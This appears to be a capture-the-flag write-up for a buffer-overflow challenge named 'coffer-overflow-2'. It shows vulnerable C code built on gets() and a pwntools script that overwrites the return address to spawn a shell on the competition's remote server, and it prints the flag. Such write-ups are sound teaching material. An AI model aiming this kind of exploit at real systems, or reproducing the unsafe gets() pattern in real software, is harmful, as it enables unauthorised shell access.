# coffer-overflow-2
This is the 3rd `buffer overflow` challeng, and it couldn't be done without some `gdb`.
## The source
```cpp
int main(void){
char name[16];
  gets(name);
}

void binFunction() {
  system("/bin/sh");
}
```
As you can see, we don't get another variable for us to overflow, instead we have a function in outside main. This case, we want to alter the `rip` registerto the address of `binFunction()` so we can get that running.

First of all, we need to find the return address of `main` and the address of `binFunction()`
## Finding Addresses (manual)
We can use `gdb` to help us.
```bash
gdb
info functinos binFunction
0x00000000004006e6
```
## The exploit
I wrote a python script(for this one, to automate it) to find the `binFunction` address and automatically generate and send the payload.
```python
from pwn import *
import sys
context(os='linux', arch='i386')
local = "./coffer-overflow-2"
host,port = "2020.redpwnc.tf",31908
conn = remote(host,port)
elf = ELF(local)
binFunction = elf.symbols["binFunction"]
size = 0x10+8
payload = "A"*size
payload += p64(binFunction)
conn.recvuntil("with?")
conn.recvline()
conn.sendline(payload)
conn.interactive()	
```
## The flag
As usual, we can cat out the flag in the shell.
```bash
cat flag.txt
flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
```